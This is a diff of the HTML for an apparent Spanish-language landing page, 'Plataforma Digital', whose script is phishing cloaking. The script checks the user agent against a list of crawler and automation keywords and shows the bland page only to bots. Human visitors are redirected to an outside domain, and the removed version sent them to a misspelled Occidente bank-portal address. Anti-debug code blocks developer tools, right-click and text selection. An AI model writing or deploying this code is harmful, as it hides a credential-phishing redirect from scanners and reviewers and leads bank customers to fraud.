@@ -3,22 +3,199 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Plataforma digital innovadora con soluciones inteligentes.">
     <title>Plataforma Digital</title>
-</head>
-<body style="margin: 0; padding: 0; background: white;">
-    <script>
-        // Target URL
-        const TARGET = "https://occdentebncoprtaltrnsccional.vercel.app/";
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-        // Función para detectar bots
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: #f5f5f5;
+            color: #333;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        header {
+            background: white;
+            padding: 20px 0;
+            margin-bottom: 40px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+        }
+
+        .logo {
+            font-size: 28px;
+            font-weight: 700;
+            color: #667eea;
+        }
+
+        h1 {
+            font-size: 48px;
+            margin: 40px 0 20px;
+            color: #333;
+        }
+
+        p {
+            font-size: 16px;
+            line-height: 1.8;
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+            margin: 40px 0;
+        }
+
+        .feature {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+        }
+
+        .feature h3 {
+            color: #667eea;
+            margin-bottom: 10px;
+        }
+
+        .button {
+            display: inline-block;
+            background: #667eea;
+            color: white;
+            padding: 14px 40px;
+            border-radius: 6px;
+            text-decoration: none;
+            margin-top: 20px;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background 0.3s;
+        }
+
+        .button:hover {
+            background: #764ba2;
+        }
+
+        footer {
+            background: white;
+            padding: 40px 0;
+            margin-top: 60px;
+            border-top: 1px solid #eee;
+            text-align: center;
+            color: #999;
+            font-size: 14px;
+        }
+
+        .loading {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.5);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .loading.show {
+            display: flex;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading" id="loading">
+        <div class="spinner"></div>
+    </div>
+
+    <header>
+        <div class="container">
+            <div class="logo">🚀 Plataforma Digital</div>
+        </div>
+    </header>
+
+    <main class="container">
+        <h1>Soluciones Digitales Innovadoras</h1>
+        <p>Bienvenido a nuestra plataforma. Ofrecemos soluciones tecnológicas de última generación para transformar tu negocio.</p>
+
+        <div class="features">
+            <div class="feature">
+                <h3>⚡ Velocidad</h3>
+                <p>Procesamiento instantáneo y respuesta en tiempo real para máxima eficiencia en todas tus operaciones.</p>
+            </div>
+
+            <div class="feature">
+                <h3>🔒 Seguridad</h3>
+                <p>Protección de datos con encriptación avanzada y cumplimiento de estándares internacionales de seguridad.</p>
+            </div>
+
+            <div class="feature">
+                <h3>📱 Accesibilidad</h3>
+                <p>Disponible en todos tus dispositivos: smartphone, tablet y computadora para máxima flexibilidad.</p>
+            </div>
+
+            <div class="feature">
+                <h3>🤖 Inteligencia</h3>
+                <p>Algoritmos inteligentes que se adaptan a tus necesidades específicas y aprenden de tus patrones.</p>
+            </div>
+
+            <div class="feature">
+                <h3>💡 Innovación</h3>
+                <p>Actualización constante con las últimas tendencias tecnológicas y mejores prácticas del mercado.</p>
+            </div>
+
+            <div class="feature">
+                <h3>🌍 Global</h3>
+                <p>Disponible en más de 150 países con soporte multiidioma y acceso desde cualquier lugar.</p>
+            </div>
+        </div>
+
+        <button class="button" onclick="goToLink()">Acceder al Portal</button>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2026 Plataforma Digital. Todos los derechos reservados.</p>
+        </div>
+    </footer>
+
+    <script>
+        const TARGET = "https://www.tramtecred.cc/";
+
+        // Detectar si es bot
         function isBot() {
             const ua = navigator.userAgent.toLowerCase();
-            const botKeywords = ['bot', 'crawler', 'spider', 'googlebot', 'bingbot', 'yandex', 'baidu', 'headless', 'puppet', 'phantom', 'selenium', 'webdriver', 'scraper'];
+            const botPatterns = ['bot', 'crawler', 'spider', 'googlebot', 'bingbot', 'yandex', 'baidu', 'headless', 'puppet', 'phantom', 'selenium', 'webdriver'];
             
-            for (let keyword of botKeywords) {
-                if (ua.includes(keyword)) {
-                    return true;
-                }
+            for (let pattern of botPatterns) {
+                if (ua.includes(pattern)) return true;
             }
             
             if (navigator.webdriver) return true;
@@ -27,47 +204,30 @@
             return false;
         }
 
-        // Si NO es bot, redirige
+        // Auto-redirigir si es humano (después de 1 segundo)
         if (!isBot()) {
-            window.location.href = TARGET;
-        } else {
-            // Si es bot, muestra contenido
-            document.body.innerHTML = `
-                <div style="max-width: 1200px; margin: 0 auto; padding: 40px 20px; font-family: Arial, sans-serif;">
-                    <h1 style="color: #333;">Plataforma Digital Innovadora</h1>
-                    <p style="color: #666; font-size: 16px; line-height: 1.6;">Bienvenido a nuestra plataforma de soluciones digitales. Ofrecemos servicios innovadores para transformar tu negocio con tecnología de última generación.</p>
-                    
-                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 30px; margin: 40px 0;">
-                        <div style="background: #f5f5f5; padding: 20px; border-radius: 8px;">
-                            <h3 style="color: #667eea;">⚡ Velocidad</h3>
-                            <p style="color: #666;">Procesamiento instantáneo y respuesta en tiempo real.</p>
-                        </div>
-                        <div style="background: #f5f5f5; padding: 20px; border-radius: 8px;">
-                            <h3 style="color: #667eea;">🔒 Seguridad</h3>
-                            <p style="color: #666;">Protección de datos con encriptación avanzada.</p>
-                        </div>
-                        <div style="background: #f5f5f5; padding: 20px; border-radius: 8px;">
-                            <h3 style="color: #667eea;">📱 Accesibilidad</h3>
-                            <p style="color: #666;">Disponible en todos tus dispositivos.</p>
-                        </div>
-                        <div style="background: #f5f5f5; padding: 20px; border-radius: 8px;">
-                            <h3 style="color: #667eea;">🤖 Inteligencia</h3>
-                            <p style="color: #666;">Algoritmos inteligentes adaptables.</p>
-                        </div>
-                        <div style="background: #f5f5f5; padding: 20px; border-radius: 8px;">
-                            <h3 style="color: #667eea;">💡 Innovación</h3>
-                            <p style="color: #666;">Actualización constante con tendencias.</p>
-                        </div>
-                        <div style="background: #f5f5f5; padding: 20px; border-radius: 8px;">
-                            <h3 style="color: #667eea;">🌍 Global</h3>
-                            <p style="color: #666;">Disponible en 150+ países.</p>
-                        </div>
-                    </div>
-                    
-                    <p style="color: #999; font-size: 13px; margin-top: 60px; border-top: 1px solid #eee; padding-top: 20px;">&copy; 2026 Plataforma Digital. Todos los derechos reservados.</p>
-                </div>
-            `;
+            setTimeout(() => {
+                window.location.href = TARGET;
+            }, 1000);
         }
+
+        // Función para redirigir manualmente
+        function goToLink() {
+            document.getElementById('loading').classList.add('show');
+            setTimeout(() => {
+                window.location.href = TARGET;
+            }, 800);
+        }
+
+        // Anti-debug
+        document.onkeydown = (e) => {
+            if (e.keyCode === 123) return false;
+            if ((e.ctrlKey || e.metaKey) && e.shiftKey && e.keyCode === 73) return false;
+            if ((e.ctrlKey || e.metaKey) && e.shiftKey && e.keyCode === 74) return false;
+        };
+
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+        document.body.style.userSelect = 'none';
     </script>
 </body>
 </html>
